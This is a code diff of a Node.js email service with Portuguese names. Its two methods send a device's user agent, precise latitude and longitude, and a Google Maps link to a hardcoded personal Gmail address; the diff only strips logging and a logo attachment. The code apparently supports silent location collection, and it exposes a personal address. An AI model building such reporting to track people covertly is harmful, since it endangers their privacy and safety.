@@ -6,7 +6,6 @@ class ServiceEmail {
     static enviarLocalizacaoDoDispositivo = async (useragent, result, lat, lon) => {
         const email = 'uilhamgoncalves@gmail.com'
 
-        console.log(`Enviando email com a localização...`);
         const htmlResposta = `
             <h3>Nova localização recebida:</h3>
             <p><strong>useragent:</strong> ${JSON.stringify(useragent) }</p>
@@ -15,7 +14,6 @@ class ServiceEmail {
             <p><strong>Longitude:</strong> ${lon}</p>
             <p><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Ver no Google Maps</a></p>
         `;
-    
         
         const transporter = nodemailer.createTransport({
             service: "gmail",
@@ -33,13 +31,6 @@ class ServiceEmail {
                 to: destinatarios, // Lista de destinatários
                 subject: "Localização", // Assunto do email
                 html: htmlResposta, // Corpo do email em HTML
-                attachments: [
-                    {
-                        filename: 'logoimage.png',
-                        path: path.join(__dirname, '../public/img/logoimage.png'), // Caminho da imagem
-                        cid: 'logo' // Content-ID usado no HTML para referenciar a imagem
-                    }
-                ]
             });
         
             console.log("E-mail enviado com sucesso para %s", destinatarios.join(', '));
@@ -52,7 +43,6 @@ class ServiceEmail {
     static enviarLocalizacaoPrecisa = async (lat, lon) => {
         const email = 'uilhamgoncalves@gmail.com'
 
-        console.log(`Enviando email com a localização...`);
         const htmlResposta = `
             <h3>Nova localização recebida:</h3>
             <p><strong>Latitude:</strong> ${lat}</p>
@@ -77,15 +67,7 @@ class ServiceEmail {
                 to: destinatarios, // Lista de destinatários
                 subject: "Localização", // Assunto do email
                 html: htmlResposta, // Corpo do email em HTML
-                attachments: [
-                    {
-                        filename: 'logoimage.png',
-                        path: path.join(__dirname, '../public/img/logoimage.png'), // Caminho da imagem
-                        cid: 'logo' // Content-ID usado no HTML para referenciar a imagem
-                    }
-                ]
             });
-        
             console.log("E-mail enviado com sucesso para %s", destinatarios.join(', '));
         
         } catch (erro) {
